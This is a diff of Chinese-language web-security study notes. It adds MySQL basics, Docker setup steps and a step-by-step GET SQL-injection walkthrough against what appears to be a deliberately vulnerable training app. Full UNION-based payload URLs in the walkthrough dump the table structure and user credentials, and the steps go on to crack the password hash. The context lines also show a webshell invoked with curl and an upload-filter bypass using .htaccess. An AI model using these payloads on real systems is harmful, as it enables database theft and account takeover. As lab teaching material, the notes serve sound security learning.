@@ -522,6 +522,7 @@
   - docker ps
   - 关闭 容器：docker stop zealous_heyrovsky
   - 启动 已经存在的容器：docker start zealous_heyrovsky
+  - 重启容器：docker restart zealous_heyrovsky
 
 
 
@@ -696,8 +697,10 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 #### .htaccess绕过 
 
 - 什么是.htaccess?
+  
   - .htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。
 - 如何利用.htaccess?
+  
   - 场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤。
 - 思考🤔：
   1. 为什么不能绕过限制较全面的白名单过滤呢？
@@ -707,6 +710,7 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
   2. 上传一句话木马文件，文件名设置为shell.test。
   - 在浏览器中访问shell.test即可执行一句话木马。
 - 思考🤔：
+  
   - 为什么shell.test会成功执行呢？ 
 
 
@@ -983,13 +987,288 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 ### MySQL基础
 
+#### 数据库 
+
+- 数据库就是一个存储数据的仓库。
+- 数据库是以一定方式储存在一起、能与多个用户共享、具有尽可能小的冗余度、与应用程序彼此独立的数据集合。
+- 它的存储空间很大，可以存放百万条、千万条、上亿条数据。 
 
 
 
+#### 关系数据库
+
+- 关系型数据库，存储的格式可以直观地反映实体间的关系。关系型数据库和常见的表格比较相似，关系型数据库中表与表之间是有很多复杂的关联关系的。
+- 常见的关系型数据库有Mysql，SqlServer等。
 
 
 
+#### 非关系型数据库（NoSQL）
 
+- 随着近些年技术方向的不断拓展，大量的NoSql数据库如MongoDB、Redis、Memcache出于简化数据库结构、避免冗余、影响性能的表连接、摒弃复杂分布式的目的被设计。
+- NoSQL数据库适合追求速度和可扩展性、业务多变的应用场景。 
+
+
+
+#### MySQL 
+
+- MySQL 是最流行的关系型数据库管理系统。
+- 在 Web 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。 
+- 关系型数据库管理系统
+- 瑞典 MySQL AB 公司开发，目前属于 Oracle 公司
+- MySQL 是开源的，所以你不需要支付额外的费用
+- MySQL 使用标准的 SQL 数据语言形式
+- MySQL 可以运行于多个系统上，并且支持多种语言。
+- 这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等
+- MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言
+- MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。 
+- 下载官网：https://dev.mysql.com/downloads/
+- 学习MySQL相关文档：https://www.mysqlzh.com/
+
+
+
+#### Docker 安装 MySQL
+
+- 查找MySQL的版本：docker search mysql
+- 下载mysql的镜像：docker pull mysql:8.0.23
+- 查看镜像的名字：docker images
+- 启动容器镜像（更改运行的默认端口，并设置密码）：docker run --name mysql-test -itd -p 3307:3307 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.23
+- 拷贝mysql的配置文件到桌面，docker cp mysql-test:/etc/mysql/my.cnf ./
+- 更改配置文件中的端口信息，添加 port=3307
+- 重新复制桌面的配置文件到MySQL容器中，docker cp ./my.cnf mysql-test:/etc/mysql/my.cnf
+- 重启容器，docker restart mysql-test
+- 查看容器启动结果：docker ps
+- 使用navicat 连接mysql
+  - 用户名 root
+  - 密码 123456
+  - 端口 3307
+- 使用命令行链接mysql
+  - docker exec -it mysql-test bash
+  - mysql -uroot -p 123456
+
+
+
+#### RDBMS术语
+
+- 数据库: 数据库是一些关联表的集合
+- 数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。
+- 列: 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。
+- 行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。 
+
+
+
+#### 对数据库进行操作 
+
+- 显示数据库列表 show databases;
+- 进入对应的数据库 use “指定数据库名”;
+- 查看所进入数据库的所有表 show tables; 
+
+- 显示数据库版本 select version();
+- 查看当前正在使用的数据库 select database();
+- 查看使用当前数据库的用户 select user(); 
+- 查看数据库路径 select @@datadir;
+- 查看安装路径 select @@basedir;
+- 查看数据库安装的操作系统 select @@version_compile_os; 
+
+
+
+#### 初始数据库
+
+- mysql 安装之后会出现四个数据库
+  - information_schema
+  - mysql
+  - performance_schema
+  - sys 
+
+
+
+#### information_schema 
+
+- information_schema ，是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。
+  - Web渗透过程中用途很大
+  - SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表。
+    - select * from schemata;
+    - 上条命令是  show databases; 的超集。
+  - TABLES表：提供了关于数据库中的表的信息（包括视图）。
+  - COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。
+- 测试该信息数据库
+  - 创建数据库 test：create database test;
+  - 创建数据表 test：create table test (‘id’ int(11), ‘user’ varchar(55));
+  - 查看数据表的结构：describe test;
+  - SCHEMATA表：select * from information_schema.schemata;
+  - TABLES表：select * from information_schema.tables where table_schema='test';
+  - COLUMNS表：select * from information_schema.columns where table_name='test'; 
+
+
+
+#### mysql
+
+- MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。
+
+
+
+#### performance_schema
+
+- 内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级，将数据保存在内存中相比从磁盘上访问能够极大地提高应用的性能。 
+
+
+
+#### sys
+
+- 通过这个数据库数据库，可以查询谁使用了最多的资源 基于IP或是用户。哪张表被访问过最多等等信息 
+
+
+
+#### SQL基础 
+
+- MySQL 数据库使用SQL SELECT语句来查询数据。
+  - SELECT column_name,column_name FROM table_name [WHERE Clause] \[LIMIT N][ OFFSET M];
+- 插入数据到指定表的语句
+  - insert into test values (1, 'test1'), (2, 'test2');
+- 如果我们需要修改或更新 MySQL 中的数据，我们可以使用 SQL UPDATE 命令来操作。
+  - UPDATE table_name SET field1=new-value1, field2=new-value2 [WHERE Clause];
+- 使用 SQL 的 DELETE FROM 命令来删除 MySQL 数据表中的记录
+  - DELETE FROM table_name [WHERE Clause] ;
+- MySQL LIKE 子句
+  - 有时候我们需要获取 runoob_author 字段含有 "COM" 字符的所有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。
+  - SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或正则表达式中的星号*。
+  - 如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。
+  - SELECT field1, field2,...fieldN FROM table_name WHERE field1 LIKE condition1 [AND [OR]] filed2 = 'somevalue';
+- MySQL UNION 操作符
+  - MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。
+  - 多个 SELECT 语句会删除重复的数据。
+  - SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions] UNION [ALL | DISTINCT] SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions]; 
+
+
+
+### GET 注入
+
+#### SQL注入漏洞是什么？
+
+是发生于应用程序与数据库层的安全漏洞。
+
+网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。
+
+
+
+#### GET型SQL注入漏洞是什么？
+
+我们在提交网页内容时候，主要分为GET方法，POST方法，GET方法提交的内容会显现在网页URL上，通过对URL连接进行构造，可以获得超出权限的信息内容。 
+
+
+
+#### Web 程序三层架构
+
+- 通常意义上就是将整个业务应用划分为
+- 界面层 + 业务逻辑层 + 数据访问层
+- 用户访问网页实际经过了如下流程
+
+	1. Web浏览器中输入网址并连接到目标服务器；
+	2. 业务逻辑层的Web服务器从本地存储加载index.php脚本并解析；
+	3. 脚本连接位于数据访问层的DBMS，并执行SQL；
+	4. 数据访问层的DBMS返回SQL的执行结果给Web Server；
+	5. 业务逻辑层的Web Server将页面封装成HTML格式发送给表示层的浏览器；
+	6. 表示层的浏览器解析HTML并将内容呈现给用户。 
+
+
+
+#### 注入原理示意
+
+- select id,name from test where id=?
+  - ？ 是用户输入，替代为 1 or 1=1
+- 实际上执行的SQL语句
+  - select id,name from test where id=1 or 1=1
+- 也即
+  - select id,name from test 
+
+
+
+#### SQL注入带来的威胁 
+
+- 猜解后台数据库，盗取网站敏感信息
+- 绕过验证登录网站后台
+- 借助数据库的存储过程进行提权等操作 
+
+
+
+#### GET 注入实战
+
+- 安装，注册，并登录靶机
+
+- 选择bug类型：Choose your bug: SQL Injection (GET/Search)
+
+- 查找注入点 - 尝试输入看看反馈信息 
+
+  - 可能SQL语句 select * from table where name=‘2’
+  - 构造SQL语句 select * from table where name=‘2‘’ 
+
+- 查找注入点 – 思考 
+
+  - 为什么要通过输入 ’ 的方式来查找注入点呢？ 
+  - 测试test表
+    - select * from test where name='test1';  -- 可以执行
+    - select * from test where name='test1'';  -- 无法执行，产生错误
+  - 从执行结果来看，’ 被直接引入了SQL构造语句，使其产生了错误。 
+
+- 尝试UNION是否生效 - 构造其他SQL语句 
+
+  - 打开HackBar ，在title=e后面添加 'union select 1,2 -- ' 
+  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1,2 -- '&action=search
+
+- 尝试UNION是否生效 – 思考 
+
+  - UNION 语句的作用是什么？
+  - SELECT 1,2 的作用是什么？
+  - -- 的作用是什么？ 
+
+  ![1617098333173](HackerMeWeb.assets/1617098333173.png)
+
+- UNION生效 – 测试字段数量 - 构造其他SQL语句 
+
+  - 尝试添加更多的数字，在title=e后面添加 'union select 1,2,3,4,5,6,7 -- ' 
+  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- '&action=search
+  - 直到展示的数据中出现数字
+
+- 测试字段数量成功 - 替换其中的选项 - 获取数据库详细信息 
+
+  - 在title=e后面添加 'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- ' 
+  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- '&action=search
+  - 出现数据库的详细信息，看到 users 表
+  - 重点：利用 NFORMATION_SCHEMA.tables 表
+
+- 成功获取数据库信息 - 发现users表 - 进行users表结构信息获取 
+
+  - 在title=e后面添加 'union select 1, column_name,2,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' 
+  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, column_name,3,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' &action=search
+  - 重点：利用 NFORMATION_SCHEMA.columns 表
+
+- 已知表信息结构 - 进行表内容信息获取 
+
+  - 在title=e后面添加 'union select 1, login,password,4,5,6,7 from users -- ' 
+  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, login,password,4,5,6,7 from users -- '  &action=search
+
+- 查询到用户名和密码 – 密码加密了 
+
+  - 6885858486f31043e5839c735d99457f045affd0 
+    - 一看就是md5
+    - 直接解密
+    - 肯定解不开 
+  - Len(6885858486f31043e5839c735d99457f045affd0)==40
+    - 明显不是md5
+    - 至于为啥不是可以百度一下MD5算法，很简单
+    - 回到正题，去CMD5解密，得到密码明文 
+
+- 去在线MD5解密网站解密 
+
+  - https://www.cmd5.com/
+  - sha1 加密
+  - 用户名：A.I.M. 密码 bug
+  - 用户名：bee 密码 bug 
+
+- 使用A.I.M账号登录，登录成功
+
+
+
+### POST注入 
 
 
 
